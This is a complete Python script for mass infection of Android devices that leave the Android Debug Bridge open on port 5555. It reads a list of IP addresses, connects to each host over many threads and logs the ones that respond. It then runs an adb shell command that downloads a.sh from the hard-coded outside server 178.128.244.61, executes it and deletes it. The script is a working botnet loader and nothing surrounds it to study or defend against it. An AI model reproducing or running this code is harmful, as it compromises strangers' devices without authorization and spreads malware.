import sys
import threading
import requests
import os
import socket
import time
from Queue import *
from threading import Thread
 
if len(sys.argv) < 3:
    sys.exit("\033[37mUsage: python "+sys.argv[0]+" [list] [output]")

ips = open(sys.argv[1], "r").readlines()
output = sys.argv[2]
queue = Queue()
queue_count = 0
 
info = open(str(sys.argv[1]),'a+')
 
def rtek(ip):
    ip = str(ip).rstrip("\n")
    try:
        adb = socket.socket()
        adb.settimeout(5)
        adb.connect((ip,5555))
        os.system("echo "+ip+" >> "+output+"")
        os.system("adb connect "+ip+"")
        time.sleep(3);
        os.system("adb -s "+ip+":5555 shell \"cd /data/local/tmp; wget http://178.128.244.61/a.sh; chmod 777 a.sh; sh a.sh; rm -rf a.sh\"")
        adb.close()
    except Exception:
        adb.close()
        pass
 

def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=rtek, args=(input,))
            thread.start()
            time.sleep(0.05)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
    thread.join()
    return


if __name__ == "__main__":
    main()